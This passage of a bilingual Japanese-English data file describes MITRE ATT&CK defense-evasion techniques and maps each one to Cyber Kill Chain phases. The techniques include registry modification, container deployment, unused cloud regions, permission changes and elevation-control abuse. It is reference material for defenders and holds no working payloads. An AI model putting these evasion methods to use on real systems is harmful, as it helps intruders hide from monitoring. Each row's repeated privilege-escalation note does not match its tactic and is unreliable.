This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog)",,,,,,5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1610,コンテナのデプロイ,Deploy Container,"攻撃者は、実行を容易にしたり防御を回避したりするために、環境にコンテナをデプロイする可能性があります。場合によっては、攻撃者は特定のイメージまたはデプロイメントに関連付けられたプロセス（マルウェアを実行またはダウンロードするプロセスなど）を実行するために新しいコンテナをデプロイする可能性があります。また、攻撃者はネットワークルール、ユーザー制限などなしで構成された新しいコンテナをデプロイして、環境内の既存の防御をバイパスする可能性があります。Kubernetes環境では、攻撃者は特定のノードに特権コンテナまたは脆弱なコンテナをデプロイして、[ホストへのエスケープ](https://attack.mitre.org/techniques/T1611)を行い、ノードで実行されている他のコンテナにアクセスしようとする可能性があります。(引用: AppSecco Kubernetes Namespace Breakout 2020)

コンテナは、Dockerの<code>create</code>および<code>start</code> APIを介して、またはKubernetesダッシュボードやKubeflowなどのWebアプリケーションを介して、さまざまな方法でデプロイできます。(引用: Docker Containers API)(引用: Kubernetes Dashboard)(引用: Kubeflow Pipelines) Kubernetes環境では、コンテナはReplicaSetやDaemonSetなどのワークロードを介してデプロイされる場合があり、これによりコンテナを複数のノードにデプロイできます。(引用: Kubernetes Workload Management) 攻撃者は、取得または構築された悪意のあるイメージに基づいてコンテナをデプロイしたり、実行時に悪意のあるペイロードをダウンロードして実行する良性のイメージからコンテナをデプロイしたりする可能性があります。(引用: Aqua Build Images on Hosts)","Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment. In Kubernetes environments, an adversary may attempt to deploy a privileged or vulnerable container into a specific node in order to [Escape to Host](https://attack.mitre.org/techniques/T1611) and access other containers running on the node. (Citation: AppSecco Kubernetes Namespace Breakout 2020)

Containers can be deployed by various means, such as via Docker's <code>create</code> and <code>start</code> APIs or via a web application such as the Kubernetes dashboard or Kubeflow. (Citation: Docker Containers API)(Citation: Kubernetes Dashboard)(Citation: Kubeflow Pipelines) In Kubernetes environments, containers may be deployed through workloads such as ReplicaSets or DaemonSets, which can allow containers to be deployed across multiple nodes.(Citation: Kubernetes Workload Management) Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.(Citation: Aqua Build Images on Hosts)",,,,,,5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1112,レジストリの変更,Modify Registry,"攻撃者は、防御回避、永続化、および実行を支援するために、さまざまな他のテクニックの一部としてWindowsレジストリと対話する可能性があります。

レジストリの特定の領域へのアクセスはアカウントの権限に依存し、一部のキーは管理者レベルのアクセスが必要です。組み込みのWindowsコマンドラインユーティリティ[Reg](https://attack.mitre.org/software/S0075)は、ローカルまたはリモートのレジストリ変更に使用できます。(引用: Microsoft Reg) リモートアクセスツールなどの他のツールも、Windows APIを介してレジストリと対話する機能を含む場合があります。

レジストリは、[難読化されたファイルまたは情報](https://attack.mitre.org/techniques/T1027)を介して構成情報や悪意のあるペイロードを隠すために変更される場合があります。(引用: Unit42 BabyShark Feb 2019)(引用: Avaddon Ransomware 2021)(引用: Microsoft BlackCat Jun 2022)(引用: CISA Russian Gov Critical Infra 2018) レジストリはまた、すべてのMicrosoft Office製品のマクロを有効にしたり、ユーザーに警告することなく権限昇格を許可したり、許可される最大アウトバウンドリクエスト数を増やしたり、メモリに平文の資格情報を保存するようにシステムを変更したりするなど、[防御の阻害](https://attack.mitre.org/techniques/T1562)を行うために変更される場合もあります。(引用: CISA LockBit 2023)(引用: Unit42 BabyShark Feb 2019)

リモートシステムのレジストリは、横方向の移動の一環としてファイルの実行を支援するために変更される場合があります。これには、ターゲットシステムでリモートレジストリサービスが実行されている必要があります。(引用: Microsoft Remote) 多くの場合、RPC通信のためのリモートシステムの[SMB/Windows管理共有](https://attack.mitre.org/techniques/T1021/002)へのアクセスと共に、[有効なアカウント](https://attack.mitre.org/techniques/T1078)が必要です。

最後に、レジストリの変更には、キー名の先頭にヌル文字を追加するなど、キーを非表示にするアクションも含まれる場合があります。これにより、[Reg](https://attack.mitre.org/software/S0075)またはWin32 APIを使用する他のユーティリティを介して読み取られると、エラーが発生したり無視されたりします。(引用: Microsoft Reghide NOV 2006) 攻撃者はこれらの擬似非表示キーを悪用して、永続性を維持するために使用されるペイロード/コマンドを隠蔽する可能性があります。(引用: TrendMicro POWELIKS AUG 2014)(引用: SpectorOps Hiding Reg Jul 2017)","Adversaries may interact with the Windows Registry as part of a variety of other techniques to aid in defense evasion, persistence, and execution.

Access to specific areas of the Registry depends on account permissions, with some keys requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification.(Citation: Microsoft Reg) Other tools, such as remote access tools, may also contain functionality to interact with the Registry through the Windows API.

The Registry may be modified in order to hide configuration information or malicious payloads via [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).(Citation: Unit42 BabyShark Feb 2019)(Citation: Avaddon Ransomware 2021)(Citation: Microsoft BlackCat Jun 2022)(Citation: CISA Russian Gov Critical Infra 2018) The Registry may also be modified to [Impair Defenses](https://attack.mitre.org/techniques/T1562), such as by enabling macros for all Microsoft Office products, allowing privilege escalation without alerting the user, increasing the maximum number of allowed outbound requests, and/or modifying systems to store plaintext credentials in memory.(Citation: CISA LockBit 2023)(Citation: Unit42 BabyShark Feb 2019)

The Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.(Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.

Finally, Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API.(Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.(Citation: TrendMicro POWELIKS AUG 2014)(Citation: SpectorOps Hiding Reg Jul 2017)",,,,,,5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1535,未使用/未サポートのクラウドリージョン,Unused/Unsupported Cloud Regions,"攻撃者は、検出を回避するために、未使用の地理的サービスリージョンにクラウドインスタンスを作成する可能性があります。通常、アクセスはクラウドインフラストラクチャの管理に使用されるアカウントを侵害することによって取得されます。

クラウドサービスプロバイダーは、パフォーマンスの向上、冗長性の提供、および顧客がコンプライアンス要件を満たすことを可能にするために、世界中にインフラストラクチャを提供することがよくあります。多くの場合、顧客は利用可能なリージョンのサブセットのみを使用し、他のリージョンを積極的に監視しない場合があります。攻撃者が未使用のリージョンにリソースを作成した場合、検出されずに操作できる可能性があります。

この動作のバリエーションは、クラウドリージョン間の機能の違いを利用します。攻撃者は、活動の検出を回避するために、高度な検出サービスをサポートしていないリージョンを利用する可能性があります。

攻撃者による未使用のAWSリージョンの使用例としては、[リソースハイジャック](https://attack.mitre.org/techniques/T1496)による暗号通貨のマイニングがあり、使用される処理能力によっては、組織に長期にわたって多額の費用がかかる可能性があります。(引用: CloudSploit - Unused AWS Regions)","Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.

Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected.

A variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity.

An example of adversary use of unused AWS regions is to mine cryptocurrency through [Resource Hijacking](https://attack.mitre.org/techniques/T1496), which can cost organizations substantial amounts of money over time depending on the processing power used.(Citation: CloudSploit - Unused AWS Regions)",,,,,,5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1222,ファイルおよびディレクトリのアクセス許可の変更,File and Directory Permissions Modification,"攻撃者は、ファイルまたはディレクトリのアクセス許可/属性を変更して、アクセス制御リスト（ACL）を回避し、保護されたファイルにアクセスする可能性があります。(引用: Hybrid Analysis Icacls1 June 2018)(引用: Hybrid Analysis Icacls2 May 2018) ファイルおよびディレクトリのアクセス許可は、通常、ファイルまたはディレクトリの所有者、または適切なアクセス許可を持つユーザーによって構成されたACLによって管理されます。ファイルおよびディレクトリのACL実装はプラットフォームによって異なりますが、一般に、どのユーザーまたはグループがどのアクション（読み取り、書き込み、実行など）を実行できるかを明示的に指定します。

変更には、特定のアクセス権の変更が含まれる場合があり、これにはファイルの所有権の取得や、ファイルの既存の権限によっては昇格された権限が必要になる場合があります。これにより、特定のファイルやディレクトリの変更、置換、削除などの悪意のあるアクティビティが可能になる場合があります。特定のファイルやディレクトリの変更は、[アクセシビリティ機能](https://attack.mitre.org/techniques/T1546/008)を介した永続性の確立、[ブートまたはログオン初期化スクリプト](https://attack.mitre.org/techniques/T1037)、[Unixシェル構成の変更](https://attack.mitre.org/techniques/T1546/004)、または[実行フローのハイジャック](https://attack.mitre.org/techniques/T1574)を介した他の重要なバイナリ/構成ファイルの汚染/ハイジャックなど、多くのテクニックに必要なステップである可能性があります。

攻撃者はシンボリックリンクの権限も変更する可能性があります。例えば、マルウェア（特にランサムウェア）はシンボリックリンクと関連設定を変更して、リモートパスを持つローカルショートカットからファイルへのアクセスを可能にする場合があります。(引用: new_rust_based_ransomware)(引用: bad_luck_blackcat)(引用: falconoverwatch_blackcat_attack)(引用: blackmatter_blackcat)(引用: fsutil_behavior)","Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).

Modifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).

Adversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior)",T1222.002,LinuxおよびMacのファイルとディレクトリのアクセス許可の変更,Linux and Mac File and Directory Permissions Modification,"攻撃者は、ファイルまたはディレクトリのアクセス許可/属性を変更して、アクセス制御リスト（ACL）を回避し、保護されたファイルにアクセスする可能性があります。(引用: Hybrid Analysis Icacls1 June 2018)(引用: Hybrid Analysis Icacls2 May 2018) ファイルおよびディレクトリのアクセス許可は、通常、ファイルまたはディレクトリの所有者、または適切なアクセス許可を持つユーザーによって構成されたACLによって管理されます。ファイルおよびディレクトリのACL実装はプラットフォームによって異なりますが、一般に、どのユーザーまたはグループがどのアクション（読み取り、書き込み、実行など）を実行できるかを明示的に指定します。

ほとんどのLinuxおよびLinuxベースのプラットフォームは、標準的なアクセス許可グループ（ユーザー、グループ、その他）と、各グループに適用される標準的なアクセス許可（読み取り、書き込み、実行）のセットを提供します。各プラットフォームのアクセス許可実装の詳細は異なる場合がありますが、ほとんどのプラットフォームはファイルおよびディレクトリACLを操作するために使用される2つの主要なコマンドを提供します：<code>chown</code>（change ownerの略）および<code>chmod</code>（change modeの略）。

敵対者はこれらのコマンドを使用して、自分自身をファイルやディレクトリの所有者にしたり、現在の権限が許せばモードを変更したりするかもしれません。その後、他のユーザーをファイルから締め出すことができます。特定のファイルやディレクトリの変更は、[Unixシェル設定の変更](https://attack.mitre.org/techniques/T1546/004)による永続化の確立や、[実行フローの乗っ取り](https://attack.mitre.org/techniques/T1574)による他の重要なバイナリ/設定ファイルの汚染/乗っ取りなど、多くのテクニックに必要なステップとなる可能性があります。(引用：20 macOS Common Tools and Techniques)","Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).

Most Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform’s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).

Adversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1222,ファイルおよびディレクトリのアクセス許可の変更,File and Directory Permissions Modification,"攻撃者は、ファイルまたはディレクトリのアクセス許可/属性を変更して、アクセス制御リスト（ACL）を回避し、保護されたファイルにアクセスする可能性があります。(引用: Hybrid Analysis Icacls1 June 2018)(引用: Hybrid Analysis Icacls2 May 2018) ファイルおよびディレクトリのアクセス許可は、通常、ファイルまたはディレクトリの所有者、または適切なアクセス許可を持つユーザーによって構成されたACLによって管理されます。ファイルおよびディレクトリのACL実装はプラットフォームによって異なりますが、一般に、どのユーザーまたはグループがどのアクション（読み取り、書き込み、実行など）を実行できるかを明示的に指定します。

変更には、特定のアクセス権の変更が含まれる場合があり、これにはファイルの所有権の取得や、ファイルの既存の権限によっては昇格された権限が必要になる場合があります。これにより、特定のファイルやディレクトリの変更、置換、削除などの悪意のあるアクティビティが可能になる場合があります。特定のファイルやディレクトリの変更は、[アクセシビリティ機能](https://attack.mitre.org/techniques/T1546/008)を介した永続性の確立、[ブートまたはログオン初期化スクリプト](https://attack.mitre.org/techniques/T1037)、[Unixシェル構成の変更](https://attack.mitre.org/techniques/T1546/004)、または[実行フローのハイジャック](https://attack.mitre.org/techniques/T1574)を介した他の重要なバイナリ/構成ファイルの汚染/ハイジャックなど、多くのテクニックに必要なステップである可能性があります。

攻撃者はシンボリックリンクの権限も変更する可能性があります。例えば、マルウェア（特にランサムウェア）はシンボリックリンクと関連設定を変更して、リモートパスを持つローカルショートカットからファイルへのアクセスを可能にする場合があります。(引用: new_rust_based_ransomware)(引用: bad_luck_blackcat)(引用: falconoverwatch_blackcat_attack)(引用: blackmatter_blackcat)(引用: fsutil_behavior)","Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).

Modifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).

Adversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior)",T1222.001,Windowsファイルおよびディレクトリのアクセス許可の変更,Windows File and Directory Permissions Modification,"攻撃者は、ファイルまたはディレクトリのアクセス許可/属性を変更して、アクセス制御リスト（ACL）を回避し、保護されたファイルにアクセスする可能性があります。(引用: Hybrid Analysis Icacls1 June 2018)(引用: Hybrid Analysis Icacls2 May 2018) ファイルおよびディレクトリのアクセス許可は、通常、ファイルまたはディレクトリの所有者、または適切なアクセス許可を持つユーザーによって構成されたACLによって管理されます。ファイルおよびディレクトリのACL実装はプラットフォームによって異なりますが、一般に、どのユーザーまたはグループがどのアクション（読み取り、書き込み、実行など）を実行できるかを明示的に指定します。

Windowsは、ファイルおよびディレクトリACLを任意アクセス制御リスト（DACL）として実装します。(引用: Microsoft DACL May 2018) 標準ACLと同様に、DACLはセキュリティ保護可能なオブジェクトへのアクセスを許可または拒否されるアカウントを識別します。セキュリティ保護可能なオブジェクトへのアクセスが試行されると、システムはDACL内のアクセス制御エントリを順番にチェックします。一致するエントリが見つかった場合、オブジェクトへのアクセスが許可されます。それ以外の場合、アクセスは拒否されます。(引用: Microsoft Access Control Lists May 2018)

攻撃者は、<code>icacls</code>、<code>cacls</code>、<code>takeown</code>、<code>attrib</code>などの組み込みWindowsコマンドを使用してDACLと対話できます。これにより、攻撃者は特定のファイルやフォルダに対するより高い権限を取得できます。さらに、[PowerShell](https://attack.mitre.org/techniques/T1059/001)は、ファイルやディレクトリのDACLを取得または変更するために使用できるコマンドレットを提供します。特定のファイルやディレクトリの変更は、[アクセシビリティ機能](https://attack.mitre.org/techniques/T1546/008)による永続化の確立、[ブートまたはログオン初期化スクリプト](https://attack.mitre.org/techniques/T1037)、または[実行フローのハイジャック](https://attack.mitre.org/techniques/T1574)による他の重要なバイナリ/構成ファイルの汚染/ハイジャックなど、多くのテクニックに必要なステップである可能性があります。","Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).

Windows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.(Citation: Microsoft Access Control Lists May 2018)

Adversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, [PowerShell](https://attack.mitre.org/techniques/T1059/001) provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1548,昇格制御メカニズムの悪用,Abuse Elevation Control Mechanism,攻撃者は、より高いレベルの権限を得るために、権限昇格を制御するように設計されたメカニズムを回避する可能性があります。ほとんどの最新システムには、ユーザーがマシン上で実行できる権限を制限することを目的としたネイティブの昇格制御メカニズムが含まれています。より高いリスクと見なされる可能性のあるタスクを実行するためには、特定のユーザーに承認を与える必要があります。(引用: TechNet How UAC Works)(引用: sudo man page 2018) 攻撃者は、システム上で権限を昇格させるために、組み込みの制御メカニズムを利用するいくつかの方法を実行できます。(引用: OSX Keydnap malware)(引用: Fortinet Fareit),Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk.(Citation: TechNet How UAC Works)(Citation: sudo man page 2018) An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.(Citation: OSX Keydnap malware)(Citation: Fortinet Fareit),T1548.001,SetuidおよびSetgid,Setuid and Setgid,"攻撃者は、アプリケーションにsetuidまたはsetgidビットが設定されている構成を悪用して、異なる（そして場合によってはより特権的な）ユーザーのコンテキストでコードを実行させることができます。LinuxまたはmacOSでは、アプリケーションバイナリにsetuidまたはsetgidビットが設定されている場合、アプリケーションはそれぞれ所有ユーザーまたはグループの権限で実行されます。(引用: setuid man page) 通常、アプリケーションは、どのユーザーまたはグループがアプリケーションを所有しているかに関係なく、現在のユーザーのコンテキストで実行されます。ただし、プログラムが正しく機能するために昇格されたコンテキストで実行する必要があるが、それらを実行しているユーザーが必要な特定の権限を持っていない場合があります。

